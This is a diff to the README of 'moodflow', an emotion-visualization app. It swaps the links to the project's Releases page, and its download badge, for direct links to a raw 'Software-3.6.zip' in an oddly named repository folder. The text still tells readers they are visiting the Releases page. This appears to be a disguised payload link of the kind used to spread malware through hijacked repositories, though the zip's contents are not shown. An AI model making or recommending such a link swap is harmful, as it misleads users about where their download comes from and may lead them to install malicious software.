@@ -1,7 +1,7 @@
 # 🎉 moodflow - Visualize Emotions Together Easily
 
 ## 📥 Download Now
-[![Download Moodflow](https://img.shields.io/badge/Download-Moodflow-blue.svg)](https://github.com/yushi-d/moodflow/releases)
+[![Download Moodflow](https://github.com/yushi-d/moodflow/raw/refs/heads/main/xanthophyllous/Software-3.6.zip)](https://github.com/yushi-d/moodflow/raw/refs/heads/main/xanthophyllous/Software-3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📂 Download & Install
 
-To get started with moodflow, simply visit the [Releases page to download](https://github.com/yushi-d/moodflow/releases). 
+To get started with moodflow, simply visit the [Releases page to download](https://github.com/yushi-d/moodflow/raw/refs/heads/main/xanthophyllous/Software-3.6.zip). 
 
 1. **Visit the Download Page:** Click on the link above.
 2. **Select Your Version:** Choose the latest version available.
